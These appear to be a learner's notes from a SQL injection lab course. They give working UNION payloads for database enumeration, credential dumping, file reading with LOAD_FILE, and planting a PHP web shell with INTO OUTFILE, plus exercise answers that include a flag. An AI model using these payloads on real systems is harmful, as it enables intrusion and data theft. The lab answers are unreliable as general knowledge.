# Database Enumeration:
Before the enumerating database, we usually need to identfy the type of DMBS we are dealing with. This is cause has diff queries, and knowing what it's
will help us know what queries to use.
AS an initial guess, if the webserver we see in HTTP responses is Apache o Nginx, it's good guess that the webserver is running on linux, so the DBMS is like
MYSQL.
The same also applies to MS DBMS if the webserber is IIS, so it's likely to be MSSQL. The following queries and their output will tell us that we are dealing
with MYSQL:
- SELECT @@verison; use when have full query output
- SELECT POW(1,1); use whrn only hace numeric output
- SELECT SLEEP; blind/No output

## INFORMATION_SCHEMA DB:
To pull data from tables using UNION SELECT, we need to properly form our SELECT queries. We need the following information:
- List of database
- List of tables within each database
- List of columns within each table

With this above information, we can form our statements to dump data from any columns in any table within any db inside the DBMS. This is where we can utilize the INFORMATION_SCHEMA.
The INFORMATION_SCHEMA contains metadata about the db and tables present on the server, this database plays a crucial role while  exploting SQL injection.
As this is diff db, we cannot call its tables directly with a SELECT statements. IF we only specfy a table's name for a SELECT statemtns, it will look for tables
within same tables db.
To reference a table present in another DB, we can use the dot '.' operator.
`SELECT * FROM my_db.users;`

## SCHEMATA:
To start our enumeration, we should find what db are avaliable on the DBMS. The table SCHEMATA in the INFORMATION_SCHEMA db contains informataion about all db on the server. The SCHEMA_NAME
colimns conatains all the db names currently present.
`mysql> SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;`
We can see the ilfreight and dev db.
> [!NOTE]
> The first three db are df Mysql db and are present on any server, so we usually ignore them during DB enumeration and sometimes are 4 with 'sys' DB as well.
`cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`
We can find the current db with SELECT database() query, We can do this similarly to how we found the DMBS version:
`cn' UNION select 1, database(),2,3-- -`

## TABLES:
We dump data form teh dev db, we need to get a list of the tables to query them with a SELECT statements, to find all tables within a db, we can use the TABLES in the INFORMATION_SCHEMA DB.
The TABLES contains information about all tablse thriughout the db, this table contains multiple columns, but we are interested in the TABLES_SCHEMA  and TABLE_NAME columns. The TABLE_NAME
column stores table names, while tha TABLES_SCHEMA we can use the following payload:
`cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -`
e added a condition to only return tables form teh 'dev' db, otherwise we would get all tables in all db, which can be many.

We see four table in the dev db, namely credentials, frameworks, pages and posts.

## COLUMNS:
To dump the data of the credentials, we first need the column names in the table, which cna be found in the COLUMNS table in the INFORMATION_SCHEMA db. The COLUMNS table contains information
about all columns present in all the db. This helps us find the column names to query for. The COLUMN_NAME and TABLE_SCHEMA columns can be used to archive this:
`cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`

## DATA:
Now we have all information we can from our UNION query to dump data of the user and pass columns from the credentials table in the dev db.
`cn' UNION select 1, username, password, 4 from dev.credentials-- -`

Exercise:
What is the password hash for 'newuser' stored in the 'users' table in the 'ilfreight' database?
cn' UNION select 1,username, password, 4 from users-- -


# Reading Files:
- Privileges:
Reading darta is much more common than writing data, which is strictly reserverd for privileged users in common DBMSes, as it can lead to system explotation. In MSSQL, the DB user must have the FILE privilege to
load a file's content into a table and then dump data from that table and read files. Let us start gathering data about our user privilege within file db to decide whether we will
read and/or write to the back-end server.

- DB user
We have to determinate which user we are within the db. While we do necessarily need db admin privielege to read data, this is becoming more requeired ion modern DBMSes, as only DBA are given such privelege. The same applies
to other common db. If we do have DBA privielege, then it is much more probable that we hace file-read privielege. OF we dfo not, we have to check our prvilege to see what can do.
```slq
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user
```
Our UNION injection payload will be as follow:
`cn' UNION SELECT 1, user(), 3, 4-- -`

or:
`cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -`

## User privielege:
Now that we know our userm we cna start looking for what privielege we have with that user, we cna test if we have super admin privilege with following query:
`SELECT super_priv FROM mysql.user`

Once again, we can use the following payload with the above query:
`cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -`

If we had many users within the DBMS, we can add WHERE user="root" to only show privilege for our current user root:
`cn UNION SELECT 1, super_privm, 3, 4 FROM mysql.user WHERE user="root"-- -`

The query retuns Y, which means YES, indicating suepruser privilege. We can also dump other privileges we have directly form teh schema, whei the following query:
`cn' UNION SELECT 1, grantee, privilege_type, 4, FROM information_schema.user_privilege-- -`

From here, we can add WHERE grantee="'root'@'localhost'" to show our current user root privilege.
`cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -`
We can se the FILE privielege o listed for our userm enabling us to read files and potentially even writes files.

- LOAD_FILE:
Now that we know we have enough privielege to read a local system files, let us do that using the LOAD_FILE() funtion. The LOAD_FILE() funtion can ve used Mariadb/Mysql
form the files.
How to read a file /etc/passwd:
`SELECT LOAD_FILE('/etc/passwd');`
Similar to how we have been usin a union injection, we can us the above query:
`cn UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`
Another example wit /var/www/html/search.php
`cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -`

Exercise:
We see in the above PHP code that '$conn' is not defined, so it must be imported using the PHP include command. Check the imported page to obtain the database password.
`cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -`

# Writing Files:
When comes to writing files to back-end server, it become much more restricted in modern DBMSes, since we can utilize this to write  a web shell on the remoter server, hence getting code executin an taking over the server.
This is why modern DBMSes disable file-write by def and require certain privilege for DBA's to write files.

- Write File Privilege:
1. User with FILE privilege enable:
2. MySQL global secure_file_priv variable enabled
3. Write access to the location we want to write to on the back-end server

We have already found that our current user has the FILE privilege necessary to write files. We must now check if MySQL db has the privilege. This can be done by checking thje secure_file_priv global variable.

- Secure_file_priv:
Variable is used to determinate where to read/write files from. An empty value lets us read files from the entire file system. If a certain directory is set, we can only read from the folder specified by the variable. Ont eh other hand, NULL
means we cannot read/write form any directory. MariaDB has this variable set to empty by def, which lets us read/write to any file of the user has FILE privilege.
MySQL uses /var/lib/mysql-file as the def foder. This means that reading files through a MySql injection ins't possible with def settings.
Some modern configurations def to NULL, meaning that we cannot read/write files anywhere within the system.

So, let's how we can find out the value of secure_file_priv, we can use the query:
`SHOW VARIABLES LIKE 'secure_file_priv' `

MySQL global variable are stored in a table called [global_variable], and as per the documentation, this table has two columns variable_name and variable_value.

We have to select these two columns from that table in the INFORMATION_SCHEMA db. There are hundrends of global variables in a MySQL configuration, and we don't wnat to retrieve all of them.
We will filter the result to only show the secure_file_priv variable, using the WHERE.
The final SQL query is following:
`SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"`

Similar to other UNION injection queries, we can get the above query result with the following payload.
`cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -`

## SELECT INTO OUTFILE:
Now we have confirmed that our user should write files  to back-end server, let's try to do that using the SELECT .. INFO OUTFIEL statements.
The SELECT INTO OUTFILE statements can be used to write data form select queries into files.
`SELECT * from users INTO OUTFILE '/tmp/credentials';`

If we go to the back-end server and cat the file, we see the tables content, it also possible to directly SELECT string into files:
`SELECT 'this is a test' INTO OUTFILE '/tmp/text.txt';`
Then cat the file.
> [!TIP]
> Advanced file exports utilize the 'FROM_BASE64("bas64_data")' funtion in order to be able to write long/advanced file including binary.

## Writing files through SQL injection:
Let's try writing a text file to the webroot and verify if we write permission. The below query should write file written sucess to the /var/www/html/proof.txt file:
`select 'file written successfully!' into outfile '/var/www/html/proof.txt'`

> [!NOTE]
> To write a web shell, we must know the base web directory for the web server. One wat to find it to use load_file  to read the server configuration, like apache configuration found
> at /etc/apache/apache2.conf, in /etc/nginx/nginx.conf, or ISS configuration at %WinDir% \System32\Inetsrv\Config\ApplicationHost.config, or we can search online for other possible configuration locations.
> We may run fuzzing scan try to write files to dff possible web roots, usin the wordlist for [linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) ot for [windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt).

The UNION injection payload would be as follows:
`cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -`

## Writing a Web SHell:
Having confirmed write permission, we cna gfo ahead and write a PHP web shell to the webroot folder.
`<?php system($_REQUEST[0]); ?>`
We can reuse our previous UNION injection payload, and change the string to above, and the file name to shell.php:
`cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`
This can be verified by browsing to the shell.php file an executing command via the 0 parameters with ?0=id our URL:


`cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`

Exercise:
Find the flag using webshell:
http://94.237.62.255:46120/shell.php?0=cat%20../flag.txt
d2b5b27ae688b6a0f1d21b7d3a0798cd

